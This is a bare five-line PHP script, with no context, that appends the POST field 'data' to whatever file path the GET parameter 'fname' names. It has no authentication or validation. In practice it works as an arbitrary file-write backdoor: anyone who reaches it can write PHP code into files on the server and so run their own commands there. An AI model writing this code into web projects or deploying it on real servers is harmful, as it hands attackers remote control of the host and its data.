<?php
$fp = fopen($_GET['fname'], 'a');
fwrite($fp, $_POST['data']);
fclose ($fp);
?>